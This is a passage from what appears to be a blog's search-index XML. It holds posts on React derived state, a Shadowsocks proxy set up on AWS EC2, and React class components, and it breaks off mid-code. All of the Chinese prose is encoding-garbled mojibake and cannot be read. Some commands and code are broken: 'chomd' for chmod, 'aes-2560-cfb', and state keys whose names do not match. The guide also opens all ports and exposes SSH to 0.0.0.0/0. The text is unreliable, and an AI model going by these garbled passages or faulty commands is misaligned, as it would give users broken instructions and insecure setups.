href="https://juejin.im/post/5b0b9b9051882515773ae714" target="_blank" rel="noopener">æµ…è°ˆ instanceof å’Œ typeof çš„å®ç°åŸç†</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React ä½ å¯èƒ½ä¸éœ€è¦æ´¾ç”Ÿçš„state</title>
      <link href="/2019/07/24/getDerivedStateFromProps/"/>
      <url>/2019/07/24/getDerivedStateFromProps/</url>
      <content type="html"><![CDATA[<h3 id="1-å®ç°éœ€æ±‚"><a href="#1-å®ç°éœ€æ±‚" class="headerlink" title="1. å®ç°éœ€æ±‚"></a>1. å®ç°éœ€æ±‚</h3><ul><li>å­ç»„ä»¶æ˜¯ä¸ªå¼¹æ¡†</li><li>çˆ¶ç»„ä»¶é€šè¿‡propså¯ä»¥æ§åˆ¶å¼¹æ¡†å‡ºç°</li><li>å¼¹æ¡†å†…æœ‰ä¸€ä¸ªå…³é—­æŒ‰é’®ï¼Œå¯ä»¥ä»¤å¼¹çª—æ¶ˆå¤±</li></ul><p><br></p><h3 id="2-å‡ºç°Bug"><a href="#2-å‡ºç°Bug" class="headerlink" title="2. å‡ºç°Bug"></a>2. å‡ºç°Bug</h3><p>ä½¿ç”¨<em><code>getDerivedStateFromProps</code></em> è®©ç»„ä»¶åœ¨propså˜åŒ–æ—¶æ›´æ–°stateã€‚ä½†å®é™…ä¸Šåªè¦çˆ¶ç»„ä»¶é‡æ–°æ¸²æŸ“æ—¶ï¼Œè¿™ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°å°±ä¼šé‡æ–°è°ƒç”¨ï¼Œä¸ç®¡ <em><code>props</code></em> æœ‰æ²¡æœ‰å˜åŒ–ã€‚å› æ­¤ä¼šå‡ºç°ä¸‹é¢çš„bugã€‚</p><table><thead><tr><th>æ“ä½œ</th><th style="text-align:center">props</th><th style="text-align:right">state</th></tr></thead><tbody><tr><td>çˆ¶ç»„ä»¶ç‚¹å‡»æ˜¾ç¤ºå¼¹çª—</td><td style="text-align:center">true</td><td style="text-align:right">true</td></tr><tr><td>å­ç»„ä»¶å…³é—­å¼¹çª—å</td><td style="text-align:center">true</td><td style="text-align:right">false</td></tr><tr><td>çˆ¶ç»„ä»¶æ‰§è¡Œrenderå‡½æ•°</td><td style="text-align:center">ture</td><td style="text-align:right">true   (æ­¤æ—¶ï¼Œæ²¡æœ‰ç‚¹å‡»æ˜¾ç¤ºå¼¹çª—ï¼Œå¼¹çª—ä¼šè‡ªåŠ¨å¼¹å‡º)</td></tr></tbody></table><p>å¦‚æœçˆ¶ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œåœ¨å­ç»„ä»¶ä¿®æ”¹çš„æ‰€æœ‰stateéƒ½ä¼šä¸¢å¤±ã€‚è¿™æ—¶ï¼Œ<code>visible</code>ä¸æ˜¯ä¸€ä¸ªå•ä¸€æ¥æºçš„å€¼ï¼Œå¯¼è‡´stateæ²¡æœ‰æ­£ç¡®æ¸²æŸ“ã€‚ç›´æ¥å°†propsç›´æ¥å¤åˆ¶åˆ°stateæ˜¯ä¸å®‰å…¨çš„ã€‚ä»»ä½•æ•°æ®ï¼Œéƒ½åº”ä¿è¯åªæœ‰ä¸€ä¸ªæ•°æ®æ¥æºï¼Œè€Œä¸”é¿å…ç›´æ¥å¤åˆ¶å®ƒã€‚<a href="https://codesandbox.io/s/mz2lnkjkrx" target="_blank" rel="noopener">å®˜æ–¹ç¤ºä¾‹</a></p><p><br></p><h3 id="3-è§£å†³æ–¹æ³•"><a href="#3-è§£å†³æ–¹æ³•" class="headerlink" title="3. è§£å†³æ–¹æ³•"></a>3. è§£å†³æ–¹æ³•</h3><h4 id="3-1-å®Œå…¨å¯å—æ§ç»„ä»¶"><a href="#3-1-å®Œå…¨å¯å—æ§ç»„ä»¶" class="headerlink" title="3.1 å®Œå…¨å¯å—æ§ç»„ä»¶"></a>3.1 å®Œå…¨å¯å—æ§ç»„ä»¶</h4><p>ä»ç»„ä»¶é‡Œåˆ é™¤stateï¼Œå˜é‡åªå—<code>props</code>æ§åˆ¶ï¼Œè°ƒç”¨çˆ¶ç»„ä»¶æ–¹æ³•ä¿®æ”¹å€¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EmailInput</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Input</span> <span class="attr">onChange</span>=<span class="string">&#123;props.onChange&#125;</span> <span class="attr">value</span>=<span class="string">&#123;props.email&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-æœ‰keyçš„éå¯æ§ç»„ä»¶"><a href="#3-2-æœ‰keyçš„éå¯æ§ç»„ä»¶" class="headerlink" title="3.2 æœ‰keyçš„éå¯æ§ç»„ä»¶"></a>3.2 æœ‰keyçš„éå¯æ§ç»„ä»¶</h4><p>è®©ç»„ä»¶è‡ªå·±å­˜å‚¨ä¸´æ—¶çš„email stateï¼Œä½†ç»„ä»¶å¯ä»¥ä»<code>props</code>æ¥æ”¶åˆå§‹å€¼ï¼Œä½†æ›´æ”¹ä¹‹åçš„å€¼å°±ä¸propsæ— å…³ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmailInput</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123; <span class="attr">email</span>: <span class="keyword">this</span>.props.defaultEmail &#125;</span><br><span class="line"></span><br><span class="line">  handleChange = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; <span class="attr">email</span>: event.target.value &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onChange</span>=<span class="string">&#123;this.handleChange&#125;</span> <span class="attr">value</span>=<span class="string">&#123;this.state.email&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br></pre></td></tr></table></figure></p><p>å½“çˆ¶ç»„ä»¶éœ€è¦æ”¹å˜stateçš„å€¼æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>key</code>è¿™ä¸ªç‰¹æ®Šçš„Reactå±æ€§ã€‚å½“<code>key</code>å˜åŒ–æ—¶ï¼ŒReactä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„è€Œä¸æ˜¯æ›´æ–°ä¸€ä¸ªæ—¢æœ‰çš„ç»„ä»¶ã€‚æ¯æ¬¡keyå˜åŒ–ï¼Œè¡¨å•é‡Œçš„æ‰€æœ‰ç»„ä»¶éƒ½ä¼šç”¨æ–°çš„åˆå§‹å€¼é‡æ–°åˆ›å»ºã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œè¿™æ˜¯å¤„ç†stateçš„æœ€å¥½åŠæ³•ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;EmailInput</span><br><span class="line">  defaultEmail=&#123;<span class="keyword">this</span>.props.user.email&#125;</span><br><span class="line">  key=&#123;<span class="keyword">this</span>.props.user.id&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-3-getDerivedStateFromProps"><a href="#3-3-getDerivedStateFromProps" class="headerlink" title="3.3 getDerivedStateFromProps"></a>3.3 getDerivedStateFromProps</h4><p>ä½†æœ‰æ—¶ç»„ä»¶åˆå§‹åŒ–çš„å¼€é”€å¤ªå¤§ï¼Œä¸€ä¸ªéº»çƒ¦ä½†å¯è¡Œçš„æ–¹æ¡ˆæ˜¯åœ¨<code>getDerivedStateFromPorps</code>è§‚å¯Ÿ<code>userID</code>çš„å˜åŒ–ã€‚è¿™æ ·å¯ä»¥ç¡®è®¤stateçš„å€¼ï¼Œæ˜¯é€šè¿‡çˆ¶ç»„ä»¶ä¿®æ”¹çš„ï¼Œå†åšå¯¹åº”çš„å¤„ç†ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmailInput</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    email: <span class="keyword">this</span>.props.defaultEmail,</span><br><span class="line">    prePropUserID: <span class="keyword">this</span>.props.userID</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> getDerivedStateFromProps(props, state) &#123;</span><br><span class="line">    <span class="keyword">if</span> (props.userID !== state.prevPropsUserID) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        email: props.defaultEmail,</span><br><span class="line">        prevPropsUserID: props.userID</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-refè°ƒç”¨å­ç»„ä»¶æ–¹æ³•"><a href="#3-4-refè°ƒç”¨å­ç»„ä»¶æ–¹æ³•" class="headerlink" title="3.4 refè°ƒç”¨å­ç»„ä»¶æ–¹æ³•"></a>3.4 refè°ƒç”¨å­ç»„ä»¶æ–¹æ³•</h4><p>æ³¨æ„ï¼Œä¸èƒ½refé«˜é˜¶ç»„ä»¶(connectåˆ°reduxçš„ç»„ä»¶)</p><p><br></p><h3 id="å‚è€ƒæ–‡æ¡£"><a href="#å‚è€ƒæ–‡æ¡£" class="headerlink" title="å‚è€ƒæ–‡æ¡£"></a>å‚è€ƒæ–‡æ¡£</h3><ul><li><a href="https://zh-hans.reactjs.org/blog/2018/06/07/you-probably-dont-need-derived-state.html#when-to-use-derived-state" target="_blank" rel="noopener">Reactæ–‡æ¡£-ä½ å¯èƒ½ä¸éœ€è¦ä½¿ç”¨æ´¾ç”Ÿstate</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ç§‘å­¦ä¸Šç½‘</title>
      <link href="/2019/07/01/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
      <url>/2019/07/01/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
      <content type="html"><![CDATA[<h4 id="1-åˆ›å»ºå®ä¾‹"><a href="#1-åˆ›å»ºå®ä¾‹" class="headerlink" title="1. åˆ›å»ºå®ä¾‹"></a>1. åˆ›å»ºå®ä¾‹</h4><p>ç™»å½•AWSæ§ä½å°ï¼Œåˆ›å»ºEC2å®ä¾‹ï¼Œè®¾ç½®å®ä¾‹</p><ul><li>å®šåˆ¶æœåŠ¡å™¨ç±»å‹: Ubuntu Server</li><li>é€‰æ‹©å®ä¾‹ç±»å‹ï¼š é»˜è®¤å…è´¹å³å¯</li><li>é…ç½®å®ä¾‹ï¼šé»˜è®¤</li><li>æ·»åŠ å­˜å‚¨ï¼šé»˜è®¤</li><li>é…ç½®å®‰å…¨ç»„ï¼šå…ˆé…ç½®æ‰€æœ‰æµé‡å’Œç«¯å£å¼€æ”¾</li><li>ç”Ÿæˆå¯†é’¥å¯¹ï¼šåˆ›å»ºæ–°å¯†é’¥å¯¹ï¼Œå¡«å†™å¯†é’¥å¯¹åç§°(å¦‚<code>ufresh2011</code>)ï¼Œä¸‹è½½å¯†é’¥å¯¹ã€‚ï¼ˆä¸‹è½½ä¸‹æ¥æ˜¯ ç§æœ‰å¯†é’¥æ–‡ä»¶ .pemæ–‡ä»¶ï¼‰ã€‚è¿æ¥è¿œç¨‹æœåŠ¡å™¨æ—¶ï¼Œéœ€è¦å†å¯†é’¥æ–‡ä»¶ä¸‹çš„æ–‡ä»¶ç›®å½•é‡Œæ“ä½œã€‚</li><li>åˆ›å»ºè´¦å•è­¦æŠ¥ï¼šæ¥å—è´¦å•è­¦æŠ¥ï¼Œè‡ªåŠ¨ç›‘æ§å…è´¹å¥—é¤æ˜¯å¦è¶…é¢ï¼Œå°†è¦è¶…é¢ä¼šå‘ä½ çš„é‚®ç®±å‘é‚®ä»¶ã€‚</li><li>ç¼–è¾‘å…¥ç«™è§„åˆ™ï¼Œå¼€é€š22ç«¯å£(ssh)å’Œ8388ç«¯å£(ssserver)<br>ç½‘ç»œä¸å®‰å…¨ -&gt; å®‰å…¨ç»„ -&gt; æ“ä½œ -&gt; ç¼–è¾‘å…¥ç«™è§„åˆ™<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> ç±»å‹ åè®® ç«¯å£èŒƒå›´ æ¥æº</span><br><span class="line">SSH TCP 22 è‡ªå®šä¹‰ 0.0.0.0/0</span><br><span class="line">è‡ªå®šä¹‰TCPè§„åˆ™ TCP 8388 è‡ªå®šä¹‰ 0.0.0.0/0</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-ç™»å½•æœåŠ¡å™¨"><a href="#2-ç™»å½•æœåŠ¡å™¨" class="headerlink" title="2. ç™»å½•æœåŠ¡å™¨"></a>2. ç™»å½•æœåŠ¡å™¨</h4><p>å®šåˆ¶å®Œæˆåï¼Œå¯ä»¥è¿œç¨‹ç™»å½•ï¼Œåœ¨å®ä¾‹ä¸Šå³å‡»ï¼Œç‚¹å‡»è¿æ¥<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chomd 400 xxx.pem</span><br><span class="line">ssh -i "xxx.pem" xxx.com</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-å®‰è£…ss"><a href="#3-å®‰è£…ss" class="headerlink" title="3. å®‰è£…ss"></a>3. å®‰è£…ss</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> è·å–rootæƒé™</span><br><span class="line">sudo -s</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> æ›´æ–°apt-get</span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> å®‰è£…pythonåŒ…ç®¡ç†å·¥å…·</span><br><span class="line">apt-get install python-setuptools</span><br><span class="line">apt-get install python3-pip</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> å®‰è£…shadowsock </span><br><span class="line">pip3 install shadowsocks</span><br></pre></td></tr></table></figure><p>é…ç½®shadowsocks<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/shadowsocks</span><br><span class="line">vim /etc/shadowsocks/config.json</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> config.jsonæ–‡ä»¶å†…å®¹</span><br><span class="line">&#123;</span><br><span class="line">  "server":"0.0.0.0",</span><br><span class="line">  "server_port":8388,</span><br><span class="line">  "local_address":"127.0.0.1",</span><br><span class="line">  "local_port":1080,</span><br><span class="line">  "password":"///",</span><br><span class="line">  "timeout":300,</span><br><span class="line">  "method":"aes-256-cfb",</span><br><span class="line">  "fast_open":false,</span><br><span class="line">  "workers": 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-å¯åŠ¨shadowsocks"><a href="#4-å¯åŠ¨shadowsocks" class="headerlink" title="4. å¯åŠ¨shadowsocks"></a>4. å¯åŠ¨shadowsocks</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> å¯åŠ¨</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d start </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>åœæ­¢</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d stop </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> é‡å¯</span><br><span class="line">ssserver -c /etc/shadowsocks/config.json -d restart</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æ—¶å€™ä¼šæœ‰æŠ¥é”™</p><ul><li>å‡çº§opensslå¯¼è‡´æ— æ³•ä½¿ç”¨<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">INFO: loading config from /etc/shadowsocks/config.json</span><br><span class="line">2019-11-16 12:49:16 INFO     loading libcrypto from libcrypto.so.1.1</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/local/bin/ssserver&quot;, line 11, in &lt;module&gt;</span><br><span class="line">    load_entry_point(&apos;shadowsocks==2.8.2&apos;, &apos;console_scripts&apos;, &apos;ssserver&apos;)()</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/server.py&quot;, line 34, in main</span><br><span class="line">    config = shell.get_config(False)</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/shell.py&quot;, line 262, in get_config</span><br><span class="line">    check_config(config, is_local)</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/shell.py&quot;, line 124, in check_config</span><br><span class="line">    encrypt.try_cipher(config[&apos;password&apos;], config[&apos;method&apos;])</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/encrypt.py&quot;, line 44, in try_cipher</span><br><span class="line">    Encryptor(key, method)</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/encrypt.py&quot;, line 83, in __init__</span><br><span class="line">    random_string(self._method_info[1]))</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/encrypt.py&quot;, line 109, in get_cipher</span><br><span class="line">    return m[2](method, key, iv, op)</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/crypto/openssl.py&quot;, line 76, in __init__</span><br><span class="line">    load_openssl()</span><br><span class="line">  File &quot;/usr/local/lib/python3.6/dist-packages/shadowsocks/crypto/openssl.py&quot;, line 52, in load_openssl</span><br><span class="line">    libcrypto.EVP_CIPHER_CTX_cleanup.argtypes = (c_void_p,)</span><br><span class="line">  File &quot;/usr/lib/python3.6/ctypes/__init__.py&quot;, line 361, in __getattr__</span><br><span class="line">    func = self.__getitem__(name)</span><br><span class="line">  File &quot;/usr/lib/python3.6/ctypes/__init__.py&quot;, line 366, in __getitem__</span><br><span class="line">    func = self._FuncPtr((name_or_ordinal, self))</span><br></pre></td></tr></table></figure></li></ul><p>å®šä½åˆ°/usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.pyæ–‡ä»¶ï¼š<br>ä¿®æ”¹<em>52ï¼Œ111</em>è¡Œå¤„çš„EVP_CIPHER_CTX_cleanupä¸ºEVP_CIPHER_CTX_reset é‡å¯æœåŠ¡</p><p><br></p><h4 id="5-ç”µè„‘ä¸Šå®‰è£…shadowsock"><a href="#5-ç”µè„‘ä¸Šå®‰è£…shadowsock" class="headerlink" title="5. ç”µè„‘ä¸Šå®‰è£…shadowsock"></a>5. ç”µè„‘ä¸Šå®‰è£…shadowsock</h4><p>æœåŠ¡å™¨åœ°å€ï¼šæŸ¥çœ‹æ­£åœ¨è¿è¡Œä¸­çš„å®ä¾‹ï¼Œæ‰¾åˆ°å…¬æœ‰ip<br>æœåŠ¡å™¨ç«¯å£ï¼š8388<br>å¯†ç ï¼š///<br>åŠ å¯†: aes-2560-cfb</p><p><em>ç»“æŸï¼</em><br><br></p><h4 id="6-åŸç†"><a href="#6-åŸç†" class="headerlink" title="6. åŸç†"></a>6. åŸç†</h4><p>åœ¨å¾ˆä¹…ä»¥å‰ï¼Œè®¿é—®å„ç§ç½‘ç«™éƒ½æ˜¯ç®€å•è€Œç›´æ¥çš„ï¼Œç”¨æˆ·çš„è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç›´æ¥å°†ä¿¡æ¯åé¦ˆç»™ç”¨æˆ·ã€‚æœ‰ä¸€å¤©ï¼ŒGFWå‡ºç°äº†ï¼Œæ¯å½“ç”¨æˆ·è·å–ä¿¡æ¯ï¼Œéƒ½ç»è¿‡GFWï¼ŒGFWå°†ä¸€äº›å†…å®¹è¿‡æ»¤æ‰ï¼Œå½“ç”¨æˆ·è§¦å‘GFWçš„è¿‡æ»¤è§„åˆ™æ—¶ï¼Œå°±ä¼šæ”¶åˆ°Connection Resetè¿™æ ·çš„å“åº”å†…å®¹ï¼Œè€Œæ— æ³•æ¥æ”¶åˆ°æ­£å¸¸çš„å†…å®¹ï¼Œ</p><p>ssåˆ©ç”¨å¢ƒå¤–æœåŠ¡å™¨ä»£ç†çš„æ–¹æ³•ç»•è¿‡GFWçš„è¿‡æ»¤ã€‚</p><ul><li>é¦–å…ˆç”¨æˆ·å’Œå¢ƒå¤–æœåŠ¡å™¨åŸºäºsshå»ºç«‹èµ·ä¸€æ¡åŠ å¯†çš„é€šé“</li><li>ç”¨æˆ·é€šè¿‡å»ºç«‹èµ·çš„éš§é“è¿›è¡Œä»£ç†ï¼Œé€šè¿‡ssh serverå‘çœŸå®çš„æœåŠ¡å‘èµ·è¯·æ±‚</li><li>è¿”å›å†…å®¹å†é€šè¿‡åˆ›å»ºå¥½çš„éš§é“è¿”å›ç»™ç”¨æˆ·ã€‚</li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://www.eeebe.com/article/ce37aebf65afbef8.html" target="_blank" rel="noopener">https://www.eeebe.com/article/ce37aebf65afbef8.html</a></li><li><a href="http://www.tengewang.cn/archives/226.html" target="_blank" rel="noopener">http://www.tengewang.cn/archives/226.html</a></li><li><a href="https://www.hhtjim.com/tag/shadowsocks" target="_blank" rel="noopener">https://www.hhtjim.com/tag/shadowsocks</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React Class ç»„ä»¶ &amp; ç»„ä»¶ä¼ å€¼ &amp; ç”Ÿå‘½å‘¨æœŸ</title>
      <link href="/2019/06/21/React%E7%BB%84%E4%BB%B6/"/>
      <url>/2019/06/21/React%E7%BB%84%E4%BB%B6/</url>
      <content type="html"><![CDATA[<h3 id="1-å¸¸ç”¨ç»„ä»¶"><a href="#1-å¸¸ç”¨ç»„ä»¶" class="headerlink" title="1. å¸¸ç”¨ç»„ä»¶"></a>1. å¸¸ç”¨ç»„ä»¶</h3><p>ç»„ä»¶å…è®¸ä½ å°† UI æ‹†åˆ†ä¸ºç‹¬ç«‹å¯å¤ç”¨çš„ä»£ç ç‰‡æ®µï¼Œå¹¶å¯¹æ¯ä¸ªç‰‡æ®µè¿›è¡Œç‹¬ç«‹æ„æ€ã€‚ç»„ä»¶ï¼Œä»æ¦‚å¿µä¸Šç±»ä¼¼äº Javascript å‡½æ•°ã€‚å®ƒæ¥å—ä»»æ„çš„å…¥å‚(props)ï¼Œå¹¶è¿”å›ç”¨äºæè¿°é¡µé¢å±•ç¤ºå†…å®¹çš„ React å…ƒç´ ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DOMæ ‡ç­¾</span></span><br><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è‡ªå®šä¹‰ç»„ä»¶</span></span><br><span class="line"><span class="keyword">const</span> element1 = <span class="xml"><span class="tag">&lt;<span class="name">Welcome</span> <span class="attr">name</span>=<span class="string">"Sara"</span>&gt;</span><span class="tag">&lt;/<span class="name">Welocme</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// classç»„ä»¶</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello, &#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ç»„ä»¶: å®šä¹‰ç»„ä»¶æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯ç¼–å†™javascriptå‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;Welcome name=<span class="string">"Sara"</span> /&gt;</span><br><span class="line">      &lt;Welcome name=<span class="string">"Cahal"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  )</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><h4 id="1-1-æ¡ä»¶æ¸²æŸ“"><a href="#1-1-æ¡ä»¶æ¸²æŸ“" class="headerlink" title="1.1 æ¡ä»¶æ¸²æŸ“"></a>1.1 æ¡ä»¶æ¸²æŸ“</h4><ul><li>ä¸è¿ç®—ç¬¦ &amp;&amp;</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Mailbox</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> unreadMessage = props.unreadMessage;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &#123;unreadMessage.length &gt; <span class="number">0</span> &amp;&amp; (</span><br><span class="line">        &lt;h2&gt;you have &#123;unreadMessage.length&#125; unread message.&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">      )&#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ä¸‰ç›®è¿ç®—ç¬¦</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 